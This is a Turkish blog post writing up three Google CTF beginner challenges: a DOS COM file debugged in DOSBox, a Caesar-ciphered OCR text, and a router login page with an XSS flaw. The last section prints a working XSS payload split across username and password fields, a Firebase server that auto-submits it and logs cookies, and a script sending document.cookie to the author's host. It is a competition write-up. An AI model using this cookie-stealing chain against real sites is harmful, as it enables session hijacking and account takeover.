---
name: 'google-ctf-macerasi-2'
title: 'Google CTF Macerası #2'
date: 1533771960
tag: 'code'
description: |
  Çok da eğlenceli olmayan anlar. Ama neyi anlar? Üşütüyorum...
---

Daha önce hiçbir **CTF**'e katılmamış biri olarak ilk maceradan çok keyif aldım. İkinci maceraya başlarken de, ilk maceradaki gibi heyecan içerisindeyim.

Bir önceki yazıya buradan ulaşabilirsiniz:

[Google CTF Macerası #1]

## Bölüm 4 (Aşağıdaki, Pembe) - Floppy2
![](/assets/google-ctf-macerasi-2/1.webp)

Bir önceki yazıdaki **Bölüm 2**'de bulunan `www.com`, şimdi işimize yarayacak gibi gözüküyor.

`www.com` dosyasının içeriği:
```
hD7X-t6ug_hl(]Wh8$^15GG1-hbrX5prPYGW^QFIuxYGFK,1-FGIuqZhHIX%A)I!hSLX4SI!{p*S:eTM'~_?o?V;m;CgAA]Ud)HO;{ l{}9l>jLLP[-`|0gvPY0onQ0geZ0wY5>D0g]h+(X-k&4`P[0/,64"P4APG
The Foobanizer9000 is no longer on the OffHub DMZ.          $
```

İlk gözüme çarpan şey, Bu dosyanın `com` uzantılı bir dosya olmasıydı.

> COM uzantısı, ilk kez DOS için 1970'lerde üretilmiştir.

Tabii artık Windows, **COM** uzantılı dosyalar yerine, "çalıştırılabilir, yürütülebilir" anlamına gelen **EXE** uzantılı dosyaları kullanıyor.

Bu dosyayı çalıştırabilmek için 16 bit bir bilgisayara ihtiyacımız var. Eğer işletim sisteminiz 32 bit ise işiniz daha kolay olabilir, çünkü daha geçen güne kadar Windows 32 bit, 16 bit uyumlu geliyordu.

### Ama benim işletim sistemim 64 bit?
İşte o zaman [DOSBOX] adlı bir programa ihtiyacınız var.

> DOSBOX, DOS işletim sistemi çalıştıran bir emülatör programıdır.

Bunun yanında **DEBUG** etmek için de bir uygulamaya ihtiyacınız var.
Şuradan indirebilirsiniz: <a href="blog/google-ctf-macerasi-2/debug.zip" target="_blank">debug.zip</a>

Dosyayı indirdikten sonra **DOSBOX**'u açıyoruz ve istediğimiz klasörü ~~mount ediyoruz~~ yerleştiriyoruz. Daha sonra yerleştirdiğimiz sürücüye giriyoruz ve dosyamızı çalıştırıyoruz.

![](/assets/google-ctf-macerasi-2/2.webp)

İndirdiğimiz **debug** dosyasının komutlarını listelemek için `?` yazıyoruz ve komutlar listeleniyor.

![](/assets/google-ctf-macerasi-2/3.webp)

Bize lazım olan komutlar `d` memory dump (bellek dökümü), `g` go (başlat) ve `q` quit (çıkış).

![](/assets/google-ctf-macerasi-2/4.webp)

Başlattıktan sonra bellek dökümüna baktığımızda flag'in burada gözüktüğünü görebiliriz.

Flag'imiz, `CTF{g00do1dDOS-FTW}`

## Bölüm 5 (Yukarıdaki, Pembe) - OCR Is Cool!
![](/assets/google-ctf-macerasi-2/5.webp)

~~Caesar Cipher'in~~ Sezar Şifrelemenin ne olduğunu bildiğim için Caesar kelimesini duyar duymaz bu bölümün ne olduğunu az çok kestirebilmiştim.
Bize bir ekran görüntüsü verilecek ve OCR (Optical Character Recognition, Optik Karakter Tanıma) ile biz bu yazıyı okuyacağız.

Daha sonra sezar şifreleme metodu kullanarak karakterleri `n` adım ileri veya geri getirerek yazıyı okunabilir hale getireceğiz.

Örneğin n=4 olsun. 

| Öncesi | Sonrası |
| :--- |:---|
| a | e |
| b | f |
| c | g |
| Merhaba | Qivlefe |

Bunun tersini yaparsak da Qivlefe kelimesinden "Merhaba"'yı bulabiliyoruz.

![](/assets/google-ctf-macerasi-2/6.webp)

`Px tkx`, `We are`'a n=7'de çevriliyor.

Hemen bir [Online OCR] bulup şansımızı deneyelim.
Ve daha sonra [Online Caesar Cipher] bulup bunu çevirelim.

Şöyle bir metin geçiyor elimize:
```
Dear Customer. 

We are already welcome to our newest customer if our secure iDrop Drive cloud file sharing service. A safe place for all your files. 

Store any file
iDropDrive starts with 15 PB if free online or offline storage, so you can keep warez, binaries, paintings, flags, firmwares. bitcoins, writeups - anything. 

See your stuff whatever
your files in iDrop Drive can be reused from any foobanizer, smart fridge 2000. smart thirst, Tempo-a-matic, or media pc. So wherever you go, your files follow. 

Share files and folders
You can quickly invite others to view, download, and collaborate on all the files you want via email attachments. Just give them the link CTF{caesarcipherisasubstitutioncipher} and they can add all your data. 

For example, download a list of files that you're currently working with us:
offhub_firmware.bin JohnTR
IOT_credentials.pdf\ \(deleted\) Wintermuted
Foobanizer9000_Manual.pdf Wintermuted
foo.ico Turbo 

Since we take security very seriously and in order to protect against vulnerabilities like efail and amdflaws, we 're sending you your credentials using the military-grade time-proven caesarean symmetric cipher.

Happy iDropDriving!
```

Burada da açıkça görüldüğü üzere şifremiz `CTF{caesarcipherisasubstitutioncipher}`

## Bölüm 6 (Ortadaki, Mavi) - ROUTER-UI
![](/assets/google-ctf-macerasi-2/7.webp)

Yapılacaklar:
- XSS açığı bul
- XSS açığını Chrome'a kaptırma
- Session bilgilerini çal
- Kedili mail at

### XSS Nedir?
> Siteler Arası Betik Çalıştırma (XSS), genellikle web uygulamalarında bulunan bir tür bilgisayar güvenlik açıklığıdır. XSS, diğer kullanıcılar tarafından görüntülenen web sayfalarına istemci taraflı kodun enjekte edilmesine imkan verir.

Öncelikle **XSS** açığı çalışıyor mu diye bir bakalım.

![](/assets/google-ctf-macerasi-2/8.webp)

Ve, anında **Chrome**'a yakalandık. :(

![](/assets/google-ctf-macerasi-2/9.webp)

Demek ki **XSS** açığı varmış. Peki Chrome'un bu açığı engellememesini nasıl sağlayabilirim?

Direk olarak _script_ çalıştırmak yerine bir kullanıcı adı/şifre denediğimde, sayfanın bana verdiği sonuç:
```
Wrong credentials: username//password
```

Burada dikkatimi çeken şey, iki adet bölü işareti bulunması. Bu işareti farklı bir siteden script çağırırken kullanabiliriz.
```
Kullanıcı adı: <script src="http:
Şifre: xava.me/hek.js"></script>
```

Dönen Mesaj:

```
Wrong credentials: 
```

Yaşasın! Scriptimizi başarıyla çalıştırdık... mı acaba?

Madem çalıştırdık, neden bir `alert` gelmedi? Hemen **Chrome Geliştirici Konsolunu** açıyorum ve **Network** sekmesini inceliyorum. 

![](/assets/google-ctf-macerasi-2/10.webp)

İsteğimizin **HTTP** portundan gönderilmesi sonucu **Mixed Content** hatasına yakalanmışız.

### Mixed Content hatasının sebebi
Sayfa **HTTPS**, diğer kaynaklar **HTTP** bağlantısı üzerinden yüklenirse; güvenli olan **SSL** sertifikası sebebiyle tarayıcı, güvensiz olan **HTTP** protokolünden yüklenmeye çalışan verilerin bağlantısını kesiyor.

İsteğimizin **HTTPS** portundan yapılması gerekiyor.
Bunun için hemen bir **FireBase** projesi açıp _hosting_ ayarladım.
```
Kullanıcı adı: <script src="https:
Şifre: xavactf.firebaseapp.com/hek.js"></script>
```

Ve istenen mesaj:
![](/assets/google-ctf-macerasi-2/11.webp)

Bundan sonrası çorap söküğü gibi gelecek. Bu **JavaScript** ile dökümana bir img elementi koyduk mu _session_ bilgileri eilimizde.

Bunun için **FireBase** üzerinde **NodeJS** kullanıyorum. Google botunu *hack*lemek için **Google** servisi kullanmak gibisi yok.

Sunucu tarafında çalışan `index.js` içeriği:
```JavaScript
const functions = require('firebase-functions');
const admin = require('firebase-admin');
const express = require('express');
const app = express();
admin.initializeApp({databaseURL: 'https://xavactf.firebaseio.com',});

app.get('/cats', (req,res) => { 
    res.send('<form action="https://router-ui.web.ctfcompetition.com/login" method="post"><input type="text" name="username" value="&#x3C;script src=&#x22;"><input type="password" name="password" value="xavactf.firebaseapp.com/hack.js&#x22;&#x3E;&#x3C;/script&#x3E;"></form><script>document.forms[0].submit();</script>');
});

app.get('/session', (req,res) => {
    admin.database().ref('/sessions').child(Date.now()).set(req.query);
    res.send("Page could not be loaded");
});

exports.app = functions.https.onRequest(app);
```

Client tarafında çalışan `hack.js` içeriği:
```JavaScript
document.writeln("<img src='https://xavactf.firebaseapp.com/session?session="+document.cookie+"' />")
```

Burada yapılan yöntem şu şekilde:
- Mail olarak `[LINK]/cats` yolluyorum
- Arkadaş maili açar açmaz kullanıcı adı ve şifresi önceden belirlenmiş bir şekilde ilgili siteye post ediliyor.
- Sitedeki XSS açığı `[LINK]/hack.js`'i çağırıyor.
- hack.js, sayfaya bir resim entegre ediyor. Resmin adresi `[LINK]/session?session=[COOKIE]` şeklinde.
- `[LINK]/session` adresi, veritabanına URL'inde bulduğu parametreleri kaydediyor.
- Ben de bu veritabanından parametreleri çekiyorum.

Kısacası, _session_ bilgilerini almak istediğim sunucu, benim **JS** betiğimi _client_ tarafında çalıştırdığında, kullanıcının tarayıcısından verileri hüpletiyorum.

![](/assets/google-ctf-macerasi-2/xss.svg)

Mailimi attım ve tuzağıma düşüşünü izledim >:)

![](/assets/google-ctf-macerasi-2/12.webp)

Tıkladığını da veritabanımdan kontrol ettim:

![](/assets/google-ctf-macerasi-2/13.webp)

_Session_ bilgileri:

`"flag=Try the session cookie; session=Avaev8thDieM6Quauoh2TuDeaez9Weja"`

_Session_ bilgilerini, *konsol*da `document.cookie="..."` çalıştırarak içeriye sızdım.

![](/assets/google-ctf-macerasi-2/14.webp)

**_Google-Haus Credentials_**'e sağ tıkladım ve...

![](/assets/google-ctf-macerasi-2/15.webp)

Şifre kabak gibi ortaya çıktı. Şifremiz, `CTF{Kao4pheitot7Ahmu}`

### Yeni bittim, yine bittim.
Bu seferki o kadar zor geçmedi sanki? Sorularınızı, yorumlarınızı bekliyorum! \^_\^

[Google CTF Macerası #1]:/google-ctf-macerasi-1
[DOSBOX]:https://www.dosbox.com/
[Online OCR]:https://www.onlineocr.net/
[Online Caesar Cipher]:https://cryptii.com/caesar-cipher